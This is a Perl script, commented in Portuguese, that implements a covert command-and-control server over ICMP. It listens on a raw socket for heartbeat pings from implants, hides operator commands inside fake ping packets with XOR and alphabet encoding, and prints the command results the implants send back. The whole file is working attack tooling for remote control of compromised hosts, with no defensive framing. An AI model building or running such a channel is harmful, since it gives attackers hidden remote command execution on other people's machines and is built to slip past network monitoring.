#!/usr/bin/perl
use strict;
use warnings;
use Socket;
use threads;
use threads::shared;

# --- ATIVAR AUTOFLUSH ---
$| = 1;

my $CHAVE_XOR = 0xAA;
my $ALFABETO  = "abcdefghijklmnop";

my $comando_pendente :shared = "";
my $tem_comando      :shared = 0;

sub checksum {
    my $msg = shift;
    my $len = length($msg);
    my $sum = 0;
    if ($len % 2) { $msg .= "\0"; $len++; }
    my @shorts = unpack("n*", $msg);
    foreach my $val (@shorts) { $sum += $val; }
    $sum = ($sum >> 16) + ($sum & 0xffff);
    $sum += ($sum >> 16);
    return (~$sum & 0xffff);
}

sub xor_data {
    my $data = shift;
    my $out = "";
    foreach my $byte (split //, $data) { $out .= chr(ord($byte) ^ $CHAVE_XOR); }
    return $out;
}

sub encode_fake_ping {
    my $data = shift;
    my $out = "";
    foreach my $byte (split //, $data) {
        my $val = ord($byte);
        $out .= substr($ALFABETO, ($val >> 4) & 0xF, 1) . substr($ALFABETO, $val & 0xF, 1);
    }
    return $out;
}

sub decode_fake_ping {
    my $data = shift;
    my $out = "";
    for (my $i = 0; $i < length($data); $i += 2) {
        my $h = index($ALFABETO, substr($data, $i, 1));
        my $l = index($ALFABETO, substr($data, $i + 1, 1));
        return undef if ($h == -1 || $l == -1);
        $out .= chr(($h << 4) | $l);
    }
    return $out;
}

sub create_packet {
    my $payload = shift;
    my $camuflado = encode_fake_ping(xor_data($payload));
    my $dummy = pack("C2 n3", 8, 0, 0, 1, 1); 
    my $chk = checksum($dummy . $camuflado);
    return pack("C2 n3", 8, 0, $chk, 1, 1) . $camuflado;
}

sub listener_loop {
    my $PROTO_ICMP = getprotobyname('icmp');
    socket(SERVER, PF_INET, SOCK_RAW, $PROTO_ICMP) or die "Erro socket: $!";
    
    print "C2 PERL ONLINE (Thread Listener Ativa)\n";
    
    while (1) {
        my $recv_data;
        # recv pode bloquear, mas em Raw Socket geralmente recebe tudo
        my $addr = recv(SERVER, $recv_data, 65535, 0);
        next unless defined $addr;
        
        my ($port, $ip_packed) = sockaddr_in($addr);
        my $ip_src = inet_ntoa($ip_packed);
        
        if (length($recv_data) > 28) {
            my $payload = substr($recv_data, 28);
            my $decoded = decode_fake_ping($payload);
            
            if (defined $decoded) {
                my $msg = xor_data($decoded);
                
                # DEBUG: Descomente para ver TUDO que chega (pode poluir a tela)
                # print "[DEBUG RAW] $msg\n";

                if ($msg =~ /HEARTBEAT/) {
                    lock($tem_comando);
                    if ($tem_comando) {
                        my $pkt = create_packet("CMD:$comando_pendente");
                        send(SERVER, $pkt, 0, $addr);
                        print "\n[+] Comando '$comando_pendente' enviado para $ip_src!\n";
                        $comando_pendente = "";
                        $tem_comando = 0;
                    }
                }
                # O /s no final permite pegar quebras de linha do ls -la
                elsif ($msg =~ /^RES:(.*)/s) {
                    my $res = $1;
                    print "\n------------------------------------------\n";
                    print "RESULTADO DE $ip_src:\n$res\n";
                    print "------------------------------------------\nC2> ";
                }
            }
        }
    }
}

if ($> != 0) { die "Erro: Execute como ROOT/SUDO.\n"; }

my $t = threads->create(\&listener_loop);
$t->detach(); 

print "C2> ";
while (my $input = <STDIN>) {
    chomp($input);
    if ($input) {
        {
            lock($tem_comando);
            $comando_pendente = $input;
            $tem_comando = 1;
        }
        print "Aguardando Heartbeat...\n";
    }
}
